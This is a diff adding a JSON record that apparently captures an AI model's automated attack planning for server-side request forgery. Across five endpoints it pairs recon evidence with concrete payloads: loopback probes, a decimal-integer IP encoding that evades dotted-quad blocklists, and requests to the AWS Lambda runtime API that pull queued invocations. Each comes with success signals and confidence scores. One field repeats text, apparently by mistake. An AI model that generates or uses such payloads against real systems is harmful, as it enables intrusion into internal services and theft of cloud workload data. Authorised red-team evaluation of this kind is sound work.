@@ -1,0 +1,68 @@
+{
+ "key": "ssrf_0",
+ "model": "opencode/glm-5.3-flash-free",
+ "class": "ssrf",
+ "variants": [
+  {
+   "endpoint": "POST /v1/link/preview",
+   "target_param": "target_url",
+   "recon_evidence": "Submitting a URL to an internal 10.x host returned the fetched page title and meta description in the preview card, proving the backend retrieves and renders arbitrary URLs server-side.",
+   "planner_rationale": "Preview renderer fetches arbitrary URLs on the server; point it at loopback to expose services behind the firewall.",
+   "vuln_class": "ssrf",
+   "payload": "http://127.0.0.1:80",
+   "injection_point": "body",
+   "expected_success_signal": "Preview card populated with the HTML title/content of the web service listening on the instance's own loopback at port 80",
+   "confidence": 0.9,
+   "reasoning": "The observed rendering of internal 10.x content proves a full-response SSRF primitive with no scheme or host restriction noted, so the plain dotted-quad loopback payload is the direct next probe; the returned preview body is the success signal."
+  },
+  {
+   "endpoint": "GET /webhooks/test",
+   "target_param": "callback",
+   "recon_evidence": "A regex on callback= rejects any dotted-quad IPv4 literal with an 'internal address profile restricted' error, yet a hostname URL passes and is fetched immediately without DNS pinning.",
+   "planner_rationale": "The blocklist matches dotted-quad only; the decimal integer form of loopback contains no dots and resolves in socket libraries.",
+   "vuln_class": "ssrf",
+   "payload": "http://2130706433/",
+   "injection_point": "query",
+   "expected_success_signal": "Webhook test sends a request whose response body/status originates from the service on 127.0.0.1 instead of the filter error",
+   "confidence": 0.85,
+   "reasoning": "2130706433 is 127.0.0.1 packed as a 32-bit integer; it is accepted directly by socket-level DNS/URL parsing while the dotted-quad regex never matches, defeating exactly the observed filter behaviour."
+  },
+  {
+   "endpoint": "POST /functions/debug/invoke",
+   "target_param": "probe_url",
+   "recon_evidence": "Debug headers (AMS 2018-06-01 / serverless-AWS-Lambda response headers) and a leaked AWS_LAMBDA_FUNCTION_NAME environment marker confirm the app runs inside an AWS Lambda worker.",
+   "planner_rationale": "Inside a Lambda worker, the runtime interface is bound to localhost:9001 and is only reachable via SSRF; fetch its pending-invocation endpoint.",
+   "vuln_class": "ssrf",
+   "payload": "http://localhost:9001/2018-06-01/runtime/invocation/next",
+   "injection_point": "body",
+   "expected_success_signal": "JSON body of the next queued Lambda invocation (requestId, event payload) returned in the debug-invoke response",
+   "confidence": 0.92,
+   "reasoning": "The Lambda runtime API serves /2018-06-01/runtime/invocation/next on localhost:9001 inside every worker; with serverless headers confirming the environment, this internal-only endpoint is reachable exclusively through the SSRF fetch primitive."
+  },
+  {
+   "endpoint": "GET /import/screenshot",
+   "target_param": "page",
+   "recon_evidence": "The screenshot service fetches the supplied URL and the rendered image shows remote page content; a dotted-quad 127.0.x.x attempt was blocked by an allowlist that only matches literal dotted-quad addresses.",
+   "planner_rationale": "The dotted-quad blocklist has a canonicalization gap; submit loopback as the integer form, which normalizes to the same address internally.",
+   "vuln_class": "ssrf",
+   "payload": "http://2130706433/",
+   "injection_point": "query",
+   "expected_success_signal": "Rendered screenshot of the rendered screenshot of the service running on the host's own loopback instead of a blocked-address error",
+   "confidence": 0.7,
+   "reasoning": "The observed block appears to be a literal dotted-quad matcher, and integer-packed 127.0.0.1 contains no dots to match; glibc and common URL parsers accept this form, so the fetcher resolves it back to loopback, though exact parser behaviour is speculative."
+  },
+  {
+   "endpoint": "GET /integrations/healthcheck",
+   "target_param": "upstream",
+   "recon_evidence": "Deployment manifest and Datadog serverless tracing headers identify the endpoint's backend as an AWS Lambda function; an in-band fetch of an attacker URL returns the raw response body.",
+   "planner_rationale": "The Lambda runtime interface hands out queued invocations on localhost:9001 — an internal-only endpoint reachable only through this SSRF.",
+   "vuln_class": "ssrf",
+   "payload": "http://localhost:9001/2018-06-01/runtime/invocation/next",
+   "injection_point": "query",
+   "expected_success_signal": "Healthcheck response contains a pending invocation's JSON payload (headers including Lambda-Runtime-Aws-Request-Id and the event document) from the runtime API",
+   "confidence": 0.88,
+   "reasoning": "Serverless tracing headers plus raw body reflection confirm both the Lambda host environment and full-response SSRF; the runtime API on localhost:9001 is the canonical internal target, and a 'next' call returning a queued invocation is the definitive success signal."
+  }
+ ],
+ "raw_tail": "Id and the event document) from the runtime API\",\n    \"confidence\": 0.88,\n    \"reasoning\": \"Serverless tracing headers plus raw body reflection confirm both the Lambda host environment and full-response SSRF; the runtime API on localhost:9001 is the canonical internal target, and a 'next' call returning a queued invocation is the definitive success signal.\"\n  }\n]\n\u001b[0m\n> build · glm-5.3-flash-free\n"
+}
